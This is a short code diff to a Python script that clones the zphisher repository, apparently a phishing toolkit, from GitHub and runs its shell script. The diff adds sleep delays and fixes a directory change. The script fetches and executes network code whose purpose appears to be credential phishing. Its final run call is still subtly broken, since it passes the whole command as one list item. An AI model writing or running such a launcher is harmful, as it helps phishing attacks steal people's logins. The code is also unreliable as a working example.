@@ -27,11 +27,20 @@ def main():
     # Wait for 5 seconds
     time.sleep(5)
 
-    # Clone zphisher repository and run zphisher.sh
+    # Clone zphisher repository
     subprocess.run(["git", "clone", "--depth=1", "https://github.com/htr-tech/zphisher.git"])
-    subprocess.run(["cd zphisher"])
+
+    # Wait for another 5 seconds
+    time.sleep(5)
+
+    # Change directory to zphisher
+    os.chdir("zphisher")
+
+    # Wait for 2 seconds
+    time.sleep(2)
+
+    # Run zphisher.sh
     subprocess.run(["bash zphisher.sh"])
 
 if __name__ == "__main__":
     main()
-
